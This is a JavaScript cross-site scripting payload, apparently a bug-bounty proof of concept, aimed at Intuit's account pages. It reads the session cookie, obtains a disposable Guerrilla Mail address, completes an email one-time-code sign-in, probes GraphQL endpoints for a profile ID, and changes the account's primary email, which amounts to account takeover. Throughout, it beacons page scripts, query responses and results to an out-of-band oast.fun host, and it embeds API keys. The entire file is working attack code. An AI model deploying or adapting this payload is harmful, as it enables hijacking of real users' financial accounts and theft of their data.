(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

var initHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_authn_session_slot':'qbn',
'intuit_origin':'https://accounts.intuit.com',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('[*] session: '+session.substring(0,20)+'...');
log('');
log('[0] Getting temp email...');

wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);

log('[1] Initialize...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid);

log('[2] Polling OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);

log('[3] Verify...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no token');
var vt=vd.verifierToken;
log('[3] Got verifierToken');

log('[4] SignIn...');
var signInHdrs={};
for(var k in initHdrs)signInHdrs[k]=initHdrs[k];
signInHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',tenantIds:['50000003'],verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}
if(!authId)throw new Error('no authId');
log('[4] authId: '+authId);

log('[4.5] Finding profileId...');

return fetch('/app/account-manager/security',{credentials:'include'})
.then(function(r){return r.text()})
.then(function(html){

var aidx=html.indexOf(authId);
if(aidx>=0){
var bigCtx=html.substring(Math.max(0,aidx-500),Math.min(html.length,aidx+2000));
log('[4.5] Extended context around authId (2500 chars):');
log(bigCtx.substring(0,600));
beacon('p27-ctx1',bigCtx.substring(0,900));
beacon('p27-ctx2',bigCtx.substring(900,1800));
beacon('p27-ctx3',bigCtx.substring(1800,2500));
}

var sre=/<script[^>]*>([\s\S]*?)<\/script>/gi;
var sm;
var scriptWithAuth='';
while((sm=sre.exec(html))!==null){
if(sm[1].indexOf(authId)>=0){
scriptWithAuth=sm[1];
break
}
}
if(scriptWithAuth){
log('[4.5] Full auth script length: '+scriptWithAuth.length);
beacon('p27-script-start',scriptWithAuth.substring(0,900));
beacon('p27-script-mid',scriptWithAuth.substring(900,1800));
beacon('p27-script-end',scriptWithAuth.substring(scriptWithAuth.length-900));
}

var updateHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_routingid':authId,
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_tid':uuid()
};

log('[4.5] Trying GraphQL queries for profileId...');

var queries=[
{name:'me',q:'query{me{id profileId}}'},
{name:'currentUser',q:'query{currentUser{id profileId}}'},
{name:'account',q:'query GetAccount($id:String!){account(id:$id){id profileId}}',v:{id:authId}},
{name:'getAccount',q:'query GetAccount($id:String!){getAccount(id:$id){id profileId personInfo{contactInfo{emails{email}}}}}',v:{id:authId}},
{name:'getAccountInfo',q:'query GetAccountInfo($accountId:String!){getAccountInfo(accountId:$accountId){id profileId}}',v:{accountId:authId}},
{name:'profile',q:'query GetProfile($accountId:String!){profile(accountId:$accountId){id}}',v:{accountId:authId}},
{name:'digitalIdentity',q:'query{digitalIdentity{id profileId legacyAuthId}}'},
{name:'identityGetPerson',q:'query GetPerson($accountId:String!){identityGetPerson(accountId:$accountId){id profileId personInfo{contactInfo{emails{email}}}}}',v:{accountId:authId}}
];

function tryQuery(idx){
if(idx>=queries.length){
log('[4.5] All queries failed');
return Promise.resolve('')
}
var qi=queries[idx];
log('[4.5] Q'+idx+': '+qi.name);
var body={query:qi.q};
if(qi.v)body.variables=qi.v;
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:updateHdrs,credentials:'include',
body:JSON.stringify(body)
}).then(function(r){return r.text()}).then(function(qr){
log('[4.5] '+qi.name+': '+qr.substring(0,200));
beacon('p27-q-'+qi.name,qr.substring(0,400));
var qrd;try{qrd=JSON.parse(qr)}catch(e){}
if(qrd&&qrd.data){
var dkeys=Object.keys(qrd.data);
for(var di=0;di<dkeys.length;di++){
var dval=qrd.data[dkeys[di]];
if(dval&&typeof dval==='object'){
if(dval.profileId)return dval.profileId;
if(dval.id&&dval.id.match(/[0-9a-f-]{36}/))return dval.id;
}
}
}
return tryQuery(idx+1)
})
}

return tryQuery(0).then(function(profileId){
if(!profileId){
log('[4.5] No profileId from queries, trying signin endpoint...');
return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({query:'query{me{id profileId}}'})
}).then(function(r){return r.text()}).then(function(qr){
log('[4.5] signin me: '+qr.substring(0,200));
beacon('p27-signin-me',qr.substring(0,400));
var qrd;try{qrd=JSON.parse(qr)}catch(e){}
if(qrd&&qrd.data&&qrd.data.me)return qrd.data.me.profileId||qrd.data.me.id||'';
return ''
})
}
return profileId
}).then(function(profileId){
log('[5] profileId: '+(profileId||'(empty)'));
beacon('p27-pid',profileId||'none');

if(!profileId){
log('[!] Could not find profileId');
return
}

log('[5] UpdateEmailAddress...');
var updateQuery='mutation UpdateEmailAddress($input:UpdateEmailAddressInput!){updateEmailAddress(request:$input){personInfo{contactInfo{emails{id active email variation{usage purposes{purpose}}}}}}}';

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:updateHdrs,credentials:'include',
body:JSON.stringify({
query:updateQuery,
variables:{input:{accountId:authId,emailAddress:{email:email,active:true,variation:{ordinal:'PRIMARY',usage:'OTHER',purposes:[{defaultPurpose:true,purpose:'OTHER'}]}},profileId:profileId,id:authId}},
operationName:'UpdateEmailAddress'
})
}).then(function(r){return r.text()}).then(function(ur){
log('[5] Response: '+ur.substring(0,400));
beacon('p27-update',ur.substring(0,400));
var urd;try{urd=JSON.parse(ur)}catch(e){}
if(urd&&urd.data&&urd.data.updateEmailAddress&&!urd.errors){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p27-done','SUCCESS email='+email);
}else{
log('[!] Failed');
}
})
})
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p27-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p27-crash?e='+encodeURIComponent(e.message);
}
})();
